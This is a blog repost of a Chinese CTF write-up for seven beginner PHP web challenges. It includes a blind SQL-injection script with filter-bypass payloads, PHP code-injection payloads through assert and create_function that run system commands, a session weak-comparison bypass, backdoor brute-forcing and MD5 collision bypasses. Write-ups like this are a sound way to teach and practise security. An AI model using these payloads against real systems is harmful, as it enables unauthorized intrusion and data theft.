@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>掘安杯网络安全技能挑战赛 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="转：https://xz.aliyun.com/t/4741  前言掘安杯网络安全技能挑战赛。题目相对简单适合新手入门，偏向php代码基础漏洞的学习。 web1题目url:http://120.79.1.69:10001/ 相当于签到题目，没什么难度， 进行抓包base64解码即可得到第一道题的flag。 amFjdGZ7OWMxZTNkMThjNDMzZDkzZDk2YTk2NGMwMGFkMz">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="掘安杯网络安全技能挑战赛">
+<meta property="og:url" content="http://yoursite.com/2019/04/08/掘安杯/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="转：https://xz.aliyun.com/t/4741  前言掘安杯网络安全技能挑战赛。题目相对简单适合新手入门，偏向php代码基础漏洞的学习。 web1题目url:http://120.79.1.69:10001/ 相当于签到题目，没什么难度， 进行抓包base64解码即可得到第一道题的flag。 amFjdGZ7OWMxZTNkMThjNDMzZDkzZDk2YTk2NGMwMGFkMz">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554700808.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554700895.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554700859.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554726024.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554702187.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554701615.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554701644.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554701698.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554701713.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554702311.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554702145.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554701756.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554710199.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554710349.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554722464.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554722619.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554722701.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554702217.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554702262.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554728299.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554702362.jpg">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554702336.jpg">
+<meta property="og:updated_time" content="2019-04-14T05:27:58.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="掘安杯网络安全技能挑战赛">
+<meta name="twitter:description" content="转：https://xz.aliyun.com/t/4741  前言掘安杯网络安全技能挑战赛。题目相对简单适合新手入门，偏向php代码基础漏洞的学习。 web1题目url:http://120.79.1.69:10001/ 相当于签到题目，没什么难度， 进行抓包base64解码即可得到第一道题的flag。 amFjdGZ7OWMxZTNkMThjNDMzZDkzZDk2YTk2NGMwMGFkMz">
+<meta name="twitter:image" content="http://47.106.185.69/1/./img/1554700808.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-掘安杯" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/04/08/掘安杯/" class="article-date">
+  <time datetime="2019-04-07T16:00:00.000Z" itemprop="datePublished">2019-04-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      掘安杯网络安全技能挑战赛
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>转：<a href="https://xz.aliyun.com/t/4741" target="_blank" rel="noopener">https://xz.aliyun.com/t/4741</a></p>
+<p><img src="http://47.106.185.69/1/./img/1554700808.jpg" alt></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>掘安杯网络安全技能挑战赛。题目相对简单适合新手入门，偏向php代码基础漏洞的学习。</p>
+<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>题目url:<a href="http://120.79.1.69:10001/" target="_blank" rel="noopener">http://120.79.1.69:10001/</a></p>
+<p>相当于签到题目，没什么难度，<br><img src="http://47.106.185.69/1/./img/1554700895.jpg" alt></p>
+<p>进行抓包base64解码即可得到第一道题的flag。<br><img src="http://47.106.185.69/1/./img/1554700859.jpg" alt></p>
+<pre><code>amFjdGZ7OWMxZTNkMThjNDMzZDkzZDk2YTk2NGMwMGFkMzBiOGZ9
+
+jactf{9c1e3d18c433d93d96a964c00ad30b8f}</code></pre><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>题目url:<a href="http://120.79.1.69:10002" target="_blank" rel="noopener">http://120.79.1.69:10002</a><br>可以下载文件源码。但是flag.txt下载不了，查看源码提示。</p>
+<p><img src="http://47.106.185.69/1/./img/1554726024.jpg" alt></p>
+<p>下载file=flag.php下载源码。</p>
+<pre><code>&lt;?php
+header(&apos;Content-Type: text/html; charset=utf-8&apos;); //网页编码
+function encrypt($data, $key) 
+{
+    $key = md5 ( $key );
+    $x = 0;
+    $len = strlen ( $data );#32
+    $l = strlen ( $key );   #5
+
+    for($i = 0; $i&lt;$len; $i ++) {
+
+        if ($x == $l) {
+            $x = 0;
+        }
+        $char .= $key {$x};
+        $x ++;
+    }
+
+    for($i = 0; $i &lt; $len; $i ++) {
+        $str .= chr ( ord ( $data {$i} ) + (ord ( $char {$i} ))%256 );
+    }
+    echo  base64_encode ( $str );
+}
+
+function decrypt($data, $key) {
+    $key = md5 ( $key );
+    $x = 0;
+    $data = base64_decode ( $data );
+    $len = strlen ( $data );
+    $l = strlen ( $key );
+    for($i = 0; $i &lt; $len; $i ++) {
+        if ($x == $l) {
+            $x = 0;
+        }
+        $char .= substr ( $key, $x, 1 );
+        $x ++;
+    }
+    for($i = 0; $i &lt; $len; $i ++) {
+        if (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) {
+            $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) );
+        } else {
+            $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) );
+        }
+    }
+    echo $str;
+}
+
+$key=&quot;MyCTF&quot;;
+$flag=&quot;o6lziae0xtaqoqCtmWqcaZuZfrd5pbI=&quot;;    
+?&gt;</code></pre><p>解读：这很明显是个加密解密，其中给了加密后的flag，利用第一个函数加密，钥匙也给了MyCTF。但是不清楚为啥给了解密算法，不给也很容易逆推就可以解出来。</p>
+<p>所以最终就是直接decrypt($flag,$key),就会打印出来flag， 也可以验证一下。</p>
+<p><img src="http://47.106.185.69/1/./img/1554702187.jpg" alt></p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>url地址：<a href="http://120.79.1.69:10003" target="_blank" rel="noopener">http://120.79.1.69:10003</a></p>
+<p>标题很简单的猜密码，</p>
+<p><img src="http://47.106.185.69/1/./img/1554701615.jpg" alt></p>
+<p>先看看源码，有PHP源码<br><img src="http://47.106.185.69/1/./img/1554701644.jpg" alt></p>
+<pre><code>session_start();
+$_SESSION[&apos;pwd&apos;]=time();
+if (isset ($_POST[&apos;password&apos;])) {
+    if ($_POST[&apos;pwd&apos;] == $_SESSION[&apos;pwd&apos;])
+        die(&apos;Flag:&apos;.$flag);
+    else{
+        print &apos;&lt;p&gt;猜测错误.&lt;/p&gt;&apos;;
+        $_SESSION[&apos;pwd&apos;]=time().time();
+    }
+}</code></pre><p>代码相当精简，如果post的pwd等于当前的时间，就返回flag,尝试过提前预判时间，发现不可以，就只能直接入手题目了，这里用到了一个弱比较，来进行一个空比较，session ID是我们可控的，pwd也是我们可控的，唯一就是session我们无法控制是多少，但是可以置为空，</p>
+<p><img src="http://47.106.185.69/1/./img/1554701698.jpg" alt></p>
+<p>删除PHPSESSID，然后使得pwd=  空，判断就变成了空等于空，可以得到flag。</p>
+<p><img src="http://47.106.185.69/1/./img/1554701713.jpg" alt></p>
+<h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>url地址：<a href="http://120.79.1.69:10004" target="_blank" rel="noopener">http://120.79.1.69:10004</a></p>
+<p>这个题一开始工具出问题扫半天没扫到，但是完全没有入手点，后来发现是工具字典问题，建议CTF找不到入手点就多扫扫，可能有遗漏，这个题目就是扫目录，有个后门文件，shell.php</p>
+<p><img src="http://47.106.185.69/1/./img/1554702311.jpg" alt></p>
+<p><img src="http://47.106.185.69/1/./img/1554702145.jpg" alt></p>
+<p>一般来说后门文件就是爆破密码，本题也不例外，在burp intruder模块里进行爆破。</p>
+<p><img src="http://47.106.185.69/1/./img/1554701756.jpg" alt></p>
+<h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p><img src="http://47.106.185.69/1/./img/1554710199.jpg" alt></p>
+<p>url地址:<a href="http://120.79.1.69:10005" target="_blank" rel="noopener">http://120.79.1.69:10005</a></p>
+<p>这道题目综合了三个知识点，python session快速计算提交，注入绕过，代码审计。综合起来还是搞了半天。</p>
+<p>1.有个登陆框，</p>
+<p><img src="http://47.106.185.69/1/./img/1554710349.jpg" alt></p>
+<p>有返回报错信息，不难想到，肯定和注入挂钩，fuzz发现，or被过滤为空，但是很容易绕过，常规双写绕过，select也被过滤了，也可以使用双写绕过，selselectect，后台验证如果是select就替换为空，selselectect 就等于 select，空格被过滤，这里用/**/替换，</p>
+<p>最终poc </p>
+<pre><code>&apos;oorr/**/ascii(substr((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1),%s,1))&gt;1/**/--/**/+&apos;</code></pre><p>如果正确的话回显用户名正确，错误的话回显用户名错误，基于布尔的盲注。脚本。</p>
+<pre><code>#!/usr/bin/python
+
+# -*- coding: UTF-8 -*-
+
+import sys
+import requests
+url=&quot;http://120.79.1.69:10005/index.php?check&quot;
+password=&quot;&quot;
+for i in range(1,30):
+    payload=&quot;&apos;oorr/**/ascii(substr((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1),%s,1))&gt;%s/**/--/**/+&apos;&quot;
+    min=10
+    max=150
+    while abs(max-min)&gt;1:
+        mid=int((max+min)/2)
+        p = payload % (str(i),str(mid))
+        data={&quot;username&quot;:p}
+        res=requests.post(url=url,data=data)
+        if res.content.find(&quot;goodboy&quot;)!=-1:
+            min=mid
+        else:
+            max=mid
+    password=password+chr(max)
+    print password</code></pre><p>得到密码。</p>
+<p><img src="http://47.106.185.69/1/./img/1554722464.jpg" alt></p>
+<p>最终poc</p>
+<pre><code>账号：&apos;&apos;&apos;=&apos;
+密码：ajahas&amp;&amp;*44askldajaj</code></pre><p>接下来快速计算验证码，py脚本，</p>
+<pre><code># -*- encoding:utf8 -*-
+import sys
+import requests
+import re
+
+url=&quot;http://120.79.1.69:10005/index.php&quot;
+
+s=requests.Session()
+
+r=s.get(url=url)
+
+matchp=re.search(r&apos;(.{1}\d+[+\-*]\d+[+\-*]\d+.{1}.{1}){4}.{1}\d+[+\-*]\d+[+\-*]\d+.{1}&apos;,r.text).group()#.{1}匹配前面任意一个字符，因为给的括号是中文括&gt;号后面同理。
+
+matchp=matchp.replace(u&apos;（&apos;,&apos;(&apos;)
+matchp=matchp.replace(u&apos;）&apos;,&apos;)&apos;)
+matchp=matchp.replace(&apos;X&apos;,&apos;*&apos;)
+
+num=round(eval(matchp))
+
+urls=&quot;http://120.79.1.69:10005/index.php?check&quot;
+
+data={&quot;username&quot;:&quot;&apos;&apos;&apos;=&apos;&quot;,&quot;code&quot;:num,&quot;password&quot;:&quot;ajahas&amp;&amp;*44askldajaj&quot;}
+
+res=s.post(url=urls,data=data)
+print (res.text)</code></pre><p>得到回显。</p>
+<p><img src="http://47.106.185.69/1/./img/1554722619.jpg" alt></p>
+<p>又进入另一个坑，下载zip包，zip包被加密了，</p>
+<p><img src="http://47.106.185.69/1/./img/1554722701.jpg" alt></p>
+<p>网页回显源码中给出了form的密码，打开form是道代码审计同样很简短。</p>
+<pre><code>Private Function getPassword(ByVal str As String) As String
+    Dim reString As String
+    Dim i As Integer
+    i = 1
+    While (i &lt;= Len(str))
+     reString = reString &amp; Mid(str, i, 1)
+     i = i + (i Mod 5)
+    Wend
+    getPassword = reString
+End Function
+
+Private Sub Command1_Click()
+   Dim Dictionary As String
+
+   Dictionary = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot;
+
+   Dim password As String
+   password = getPassword(Dictionary)
+   Dim psw As String
+   psw = Text1.Text
+   If (psw = password) Then
+    MsgBox &quot;The password is correct!&quot;, vbOKOnly, &quot;密码正确&quot; 
+    Text1.Text = &quot;Password for next pass : &quot; &amp; getPassword(password)    
+   Else
+    MsgBox &quot;PasswordFail!&quot;, vbOKOnly, &quot;密码错误&quot;    
+   End If   
+End Sub</code></pre><p>写个python脚本解出flag.jpg的压缩密码。</p>
+<pre><code># -*- encoding:utf8 -*-
+
+def getPassword(str):
+    restr=&apos;&apos;
+    i=1
+    while i &lt;=(len(str)):
+        restr= restr+(str[i-1:i])
+        i=i+(i%5)
+    return restr
+dict=&quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot;
+
+password=getPassword(dict)
+password=getPassword(password)
+
+print (password)</code></pre><p>得到密码 VmH0wW3DZalBnmmSalV1SYSGRr1r3jVYcFrHWkUUlhljkFzCbXaEKyaVJymT1FlVTVskVWhGtonaGU2WWGhVXYol1WVI1F2odFuk</p>
+<p>将flag.jpg以txt方式打开得到flag。</p>
+<h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p>url地址：<a href="http://120.79.1.69:10006" target="_blank" rel="noopener">http://120.79.1.69:10006</a></p>
+<p>一道代码审计题目，依然很精简。</p>
+<p><img src="http://47.106.185.69/1/./img/1554702217.jpg" alt></p>
+<pre><code>&lt;?php
+error_reporting(0);
+if(isset($_GET[&apos;action&apos;])) {
+    $action = $_GET[&apos;action&apos;];
+}
+
+if(isset($_GET[&apos;action&apos;])){
+    $arg = $_GET[&apos;arg&apos;];
+}
+
+if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)){
+    show_source(__FILE__);
+} else {
+    $action($arg,&apos;&apos;);
+} </code></pre><p>正则匹配</p>
+<pre><code>i 不区分大小写
+/s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[fnrtv]
+/D如果使用$限制结尾字符,则不允许结尾有换行;</code></pre><p>精简的源码，考的代码执行，可以参考一下P牛 的create_function()代码注入，不过本题稍微有点点变化，本题其实只有一个点，</p>
+<p>传入action参数，我们可控函数，寻找一个能够执行命令的函数就可以，但是需要这个函数有两个参数，eval就不可以，assert可以传入两个参数，可以直接getshell，</p>
+<p>正则匹配绕过匹配开头，使用\绕过。</p>
+<p>完整poc <a href="http://120.79.1.69:8886/web6?action=\assert&amp;arg=system(&#39;dir&#39;)" target="_blank" rel="noopener">http://120.79.1.69:8886/web6?action=\assert&amp;arg=system(&#39;dir&#39;)</a></p>
+<p>由于题目关闭了，本地复现，</p>
+<p><img src="http://47.106.185.69/1/./img/1554702262.jpg" alt></p>
+<p>通过命令查找，即可获得flag。</p>
+<p>参考文章：<a href="https://mochazz.github.io/2019/01/12/create_function%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0RCE/" target="_blank" rel="noopener">https://mochazz.github.io/2019/01/12/create_function%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0RCE/</a></p>
+<p>后来题目环境变了， assert不能使用了，之前assert可以说是个bug，还是要来一遍正规做法。</p>
+<p>题目url:<a href="http://120.79.1.69:10006" target="_blank" rel="noopener">http://120.79.1.69:10006</a></p>
+<p>首先要绕过正则，数字字母下划线被过滤，但是需要调用函数，使用create_function创建函数，\create_function就是调用全局的create_function函数，正好绕过了正则，接下来就是拼接字符串。poc</p>
+<pre><code>http://120.79.1.69:10006?action=\create_function&amp;arg=){}system(&apos;ls&apos;);//</code></pre><p>拼入字符串后的结果。  </p>
+<pre><code>\create_function(){}system(&apos;ls&apos;);//,&apos;&apos;); </code></pre><p>得到flag。</p>
+<p><img src="http://47.106.185.69/1/./img/1554728299.jpg" alt></p>
+<h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p>这道题目依然是代码审计，主要是考弱比较以及MD5等方面的绕过。</p>
+<p>题目url:<a href="http://120.79.1.69:8887/web7" target="_blank" rel="noopener">http://120.79.1.69:8887/web7</a></p>
+<p>打开即可获得源码，这里我贴出源码。</p>
+<pre><code>&lt;?php
+highlight_file(__FILE__);
+include(&apos;flag.php&apos;);
+$str1 = @$_GET[&apos;str1&apos;];
+$str2 = @$_GET[&apos;str2&apos;];
+$str3 = @$_GET[&apos;str3&apos;];
+$str4 = @$_GET[&apos;str4&apos;];
+$str5 = (string)@$_POST[&apos;str5&apos;];
+$str6 = (string)@$_POST[&apos;str6&apos;];
+$str7 = (string)@$_POST[&apos;str7&apos;];
+if( $str1 == $str2 ){
+    die(&apos;str1 OR Sstr2 no no no&apos;);
+}
+if( md5($str1) != md5($str2) ){
+    die(&apos;step 1 fail&apos;);
+}
+if( $str3 == $str4 ){
+    die(&apos;str3 OR str4 no no no&apos;);
+}
+if ( md5($str3) !== md5($str4)){
+    die(&apos;step 2 fail&apos;);
+}
+if( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 ){
+    die(&apos;str5 OR str6 OR str7 no no no&apos;);
+}
+if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7)){
+    die(&apos;step 3 fail&apos;);
+}
+
+if(!($_POST[&apos;a&apos;]) and !($_POST[&apos;b&apos;]))
+{
+    echo &quot;come on!&quot;;
+    die();
+}
+$a = $_POST[&apos;a&apos;];
+$b = $_POST[&apos;b&apos;];
+$m = $_GET[&apos;m&apos;];
+$n = $_GET[&apos;n&apos;];
+
+if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; 6)) 
+{
+    echo &quot;a OR b fail!&quot;;
+    die();
+}
+
+if ((strlen($m) &gt; 4) || (strlen($n) &gt; 4)) 
+{
+    echo &quot;m OR n fail&quot;;
+    die();
+}
+
+$str8 = hash(&apos;md5&apos;, $a, false);
+$str9 = strtr(hash(&apos;md5&apos;, $b, false), $m, $n);
+
+echo &quot;&lt;p&gt;str8 : $str8&lt;/p&gt;&quot;;
+echo &quot;&lt;p&gt;str9 : $str9&lt;/p&gt;&quot;;
+
+if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6))
+{
+    echo &quot;You&apos;re great,give you flag:&quot;;
+    echo $flag;
+}</code></pre><p>还算比较常规比较简单的源码，主要是考几个php知识点。</p>
+<p>1.首先需要传参数str1不能等于str2，但是需要md5一样，不清楚的百度php md5弱比较。也就是字符串QNKCDZO 和字符串s878926199a，这两个加密出来的md5是</p>
+<pre><code>MD5(&quot;QNKCDZO&quot;)=0e830400451993494058024219903391
+MD5(&quot;s878926199a&quot;)=0e545993274517709034328855841020</code></pre><p>在php中如果是0e开头的字符串进行==比较，会认为是科学记数法0e，0的几次方，所以结果自然是0，这样就达到了字符串比较不相等，但是MD5值相等的绕过方法，前提是0e后面跟的是数字，如果是0e1a223…，0e后面有个a字母则无法转化成0。</p>
+<p>2.str3和str4和str1 str2差不多，唯一变化是这次用到了!==需要绕过，但是在这种严密的!==，0e这种不可以绕过了，他会一个一个字符的对比，而不是解析为0，这个时候需要用到数组类型不同来绕过，也就是str3[]=1,str4=0，因为这两种根本不是同一种类型的，所以自然无法比较返回false，进而绕过。</p>
+<p>3.str5 str6 str7，首先第一个肯定不能三个相等，但是下面又用严格的判断必须md5相等，在php中===和!==这种几乎是没办法绕过的，所以只能让他们的md5真正相等，如果一开始就去绕可能就陷进去了，这个判断的难点在于找到三个真正相等的MD5值的原型。这里参考一篇文章。</p>
+<pre><code>https://xz.aliyun.com/t/3161#toc-5</code></pre><p>基于全等的MD5碰撞绕过这一目录下的讲解，很详细，需要下载他所说的两个工具，然后按照他的命令</p>
+<pre><code>D:\fastcoll&gt;fastcoll_v1.0.0.5.exe -o jlzj0 jlzj1      #-o参数代表随机生成两个相同MD5的文件
+D:\fastcoll&gt;fastcoll_v1.0.0.5.exe -p jlzj1 -o jlzj00 jlzj01  #-p参数代表根据jlzj1文件随机生成两个相同MD5的文件，注意：生成的MD5与jlzj1不同
+D:\fastcoll&gt;tail.exe -c 128 jlzj00 &gt; a                #-c 128代表将jlzj00的最后128位写入文件a，这128位正是jlzj1与jlzj00的MD5不同的原因
+D:\fastcoll&gt;tail.exe -c 128 jlzj01 &gt; b                #同理
+D:\fastcoll&gt;type jlzj0 a &gt; jlzj10                    #这里表示将jlzj0和a文件的内容合并写入jlzj10
+D:\fastcoll&gt;type jlzj0 b &gt; jlzj11                    #同理写入jlzj11</code></pre><p>生成文件即可，生成的文件内容进行MD5加密就是相同的，但是需要url编码提交到burp里面发包,如果在浏览器里会自动解码，出现大大小小的各种问题。</p>
+<pre><code>编码参考：https://xz.aliyun.com/t/2232</code></pre><p>最终将生成的三个url编码之后的分别复制给str5 str6 str7。</p>
+<p>4.第四个点，首先post a和b，然后进入第二个判断，a必须是大写字母，b必须是数字，(is_numeric函数也有一些漏洞)，b的长度不能大于6，这里我们把视角移到最后一个if判断</p>
+<pre><code>if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6)) </code></pre><p>这里用===判断，b的长度必须为6，刚刚我们说了===很难绕过，所以b的长度就只能为6，其中a不能等于b，这个很容易做到，str8 == str9，</p>
+<pre><code>$str8 = hash(&apos;md5&apos;, $a, false); 
+$str9 = strtr(hash(&apos;md5&apos;, $b, false), $m, $n); </code></pre><p>很显然又是需要0e来绕过使得md5后的a b相等，这里a的值很简单，利用网上现有的MD5之后的原型QNKCDZO，并且都是大写，但是b想要找到六位的并且0e开头能够利用的仿佛并找不到，这里想了很久，不过还好有一个字符替换，</p>
+<pre><code>strtr(hash(&apos;md5&apos;, $b, false), $m, $n)</code></pre><p>这里是将m替换为n，这样我们就可以利用替换，将一些可能构造的md5值构造成我们需要的，比如 0e123123aaa，我们可以让m=a，n=1，替换为0e123123111，这样就可以进行判断绕过了，这里还要提到上面提示了一个点用is_numeric函数的漏洞，他可以接受十六进制，0xFFFF他同样认为是数字，所以我们写个脚本找到0e开头的md5值，然后替换掉其中的字母，最终绕过。</p>
+<pre><code>for($i=1000;$i&lt;9999;$i++)
+{
+    $b=&quot;0x&quot;.$i;
+
+    #echo md5($b);
+    $c=md5($b);
+
+    if(preg_match(&apos;/^0e/&apos;,$c))
+    {
+        echo $b.&quot;=====&gt;&gt;&quot;;
+        echo $c;
+        echo &quot;&lt;br/&gt;&quot;;
+
+    }
+
+}</code></pre><p><img src="http://47.106.185.69/1/./img/1554702362.jpg" alt></p>
+<p>选择其中一个 </p>
+<p>0x6156=====&gt;&gt;0ec4899c94ada8d08a6ada8623c6ff01</p>
+<p>刚好md5值有数字 cadf，四个字符刚好用长度最大为4的m n来替换，完整的poc，得到flag。</p>
+<p><img src="http://47.106.185.69/1/./img/1554702336.jpg" alt></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/04/08/掘安杯/" data-id="ck0l0oh9w001wpy2idhf5v3t5" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/04/13/西湖挑战赛/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          西湖挑战赛web
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/03/23/一些脚本poc/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">poc脚本整理</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
